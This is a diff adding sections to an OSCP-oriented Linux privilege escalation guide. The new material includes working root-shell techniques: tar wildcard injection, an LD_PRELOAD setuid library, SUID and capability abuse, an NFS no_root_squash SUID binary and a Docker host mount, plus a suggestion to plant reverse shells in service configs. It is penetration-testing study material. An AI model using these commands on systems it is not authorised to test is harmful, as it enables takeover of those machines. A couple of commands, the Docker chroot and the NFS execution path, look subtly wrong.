@@ -16,9 +16,23 @@
 8. [Exploiting Writable Configuration Files](#exploiting-writable-configuration-files)
 9. [Password Hunting](#password-hunting)
 10. [Network Services](#network-services)
-11. [Custom Exploits](#custom-exploits)
-12. [Checklist for OSCP](#checklist-for-oscp)
-13. [References](#references)
+11. [Wildcards Cheat Sheet](#wildcards-cheat-sheet)
+12. [Additional Techniques](#additional-techniques)
+    - [Shell Escaping](#shell-escaping)
+    - [Intended Functionality](#intended-functionality)
+    - [LD_PRELOAD](#ld_preload)
+    - [CVE-2019-14287](#cve-2019-14287)
+    - [CVE-2019-18634](#cve-2019-18634)
+    - [SUID Attacks](#suid-attacks)
+    - [Shared Object Injection](#shared-object-injection)
+    - [Binary Symlinks](#binary-symlinks)
+    - [Environment Variables](#environment-variables)
+    - [Capabilities Attacks](#capabilities-attacks)
+    - [NFS](#nfs)
+    - [Docker](#docker)
+13. [Custom Exploits](#custom-exploits)
+14. [Checklist for OSCP](#checklist-for-oscp)
+15. [References](#references)
 
 ## Introduction
 Privilege escalation is a critical step in penetration testing. This guide is tailored for OSCP preparation and covers various techniques to escalate privileges on Linux systems.
@@ -102,6 +116,11 @@ cat /etc/crontab
 ls -la /etc/cron.*
 ```
 
+Check for writable cron scripts or paths:
+```bash
+find / -writable -path /etc/cron* 2>/dev/null
+```
+
 ## Path Abuse
 If a binary is running as root but does not use absolute paths, you can exploit the PATH variable.
 
@@ -112,13 +131,16 @@ echo '/bin/bash' > /tmp/ls
 chmod +x /tmp/ls
 ```
 
+Run the vulnerable script and gain shell access.
+
 ## Exploiting Writable Configuration Files
 Identify writable configuration files for services:
 ```bash
 find / -name "*.conf" -writable 2>/dev/null
 ```
 
-Modify configurations to inject malicious commands or code.
+Modify configurations to inject malicious commands or code. For example:
+- Add a reverse shell payload to an Apache or MySQL configuration file.
 
 ## Password Hunting
 Search for plaintext passwords in files:
@@ -132,6 +154,8 @@ Check bash history:
 cat ~/.bash_history
 ```
 
+Look for SSH private keys or other sensitive credentials.
+
 ## Network Services
 Check listening services:
 ```bash
@@ -139,7 +163,94 @@ netstat -tuln
 ss -tuln
 ```
 
-Enumerate running services and associated configurations.
+Enumerate running services and associated configurations. For example:
+- Check `rsync`, `FTP`, or `MySQL` services for misconfigurations.
+
+## Wildcards Cheat Sheet
+- Wildcards in commands like `tar`, `rsync`, and `scp` can be abused for privilege escalation.
+
+### Example:
+If a script uses wildcards without sanitization:
+```bash
+echo 'echo hacked > /root/hacked.txt' > --checkpoint-action=exec=sh
+echo '' > --checkpoint=1
+tar cf archive.tar *
+```
+This creates malicious files that execute commands when the wildcard is processed.
+
+## Additional Techniques
+
+### Shell Escaping
+- Exploit interactive programs to escape to a shell.
+  ```bash
+  python -c 'import pty; pty.spawn("/bin/bash")'
+  ```
+
+### Intended Functionality
+- Abuse legitimate features of software for privilege escalation.
+
+### LD_PRELOAD
+- Exploit dynamic linker preload to inject malicious libraries.
+  ```bash
+  echo -e "#include <stdio.h>\n#include <stdlib.h>\nvoid _init() { setgid(0); setuid(0); system(\"/bin/bash\"); }" > /tmp/preload.c
+  gcc -shared -fPIC -o /tmp/preload.so /tmp/preload.c
+  LD_PRELOAD=/tmp/preload.so <vulnerable_command>
+  ```
+
+### CVE-2019-14287
+- Exploit sudo bypass vulnerability where `ALL` in `sudoers` allows unintended command execution.
+
+### CVE-2019-18634
+- Exploit buffer overflow in `pwfeedback` to gain privilege escalation.
+
+### SUID Attacks
+- Use SUID binaries to gain root access.
+  ```bash
+  /usr/bin/find . -exec /bin/sh \; -quit
+  ```
+
+### Shared Object Injection
+- Inject malicious shared libraries into writable directories.
+
+### Binary Symlinks
+- Create symlinks to overwrite or abuse binaries.
+
+### Environment Variables
+- Exploit environment variables such as `LD_LIBRARY_PATH` or `PATH`.
+
+### Capabilities Attacks
+- Exploit binary capabilities to escalate privileges.
+  ```bash
+  getcap -r / 2>/dev/null
+  ```
+  Example:
+  ```bash
+  /usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
+  ```
+
+### NFS
+- Check `/etc/exports` for misconfigurations. Look for entries like:
+  ```
+  /shared *(rw,no_root_squash)
+  ```
+- Mount the share:
+  ```bash
+  mkdir /tmp/nfs_mount
+  mount -o rw <server_ip>:/shared /tmp/nfs_mount
+  ```
+- If `no_root_squash` is enabled, create SUID binaries on the share.
+  ```bash
+  echo -e "#include <stdio.h>\n#include <stdlib.h>\nvoid main() { setgid(0); setuid(0); system(\"/bin/bash\"); }" > /tmp/nfs_mount/root_shell.c
+  gcc -o /tmp/nfs_mount/root_shell /tmp/nfs_mount/root_shell.c
+  chmod +s /tmp/nfs_mount/root_shell
+  ./tmp/nfs_mount/root_shell
+  ```
+
+### Docker
+- Abuse Docker group membership to gain root access.
+  ```bash
+  docker run -v /:/mnt --rm -it alpine chroot / sh
+  ```
 
 ## Custom Exploits
 Sometimes, custom scripts or binaries may have vulnerabilities. Review custom software carefully.
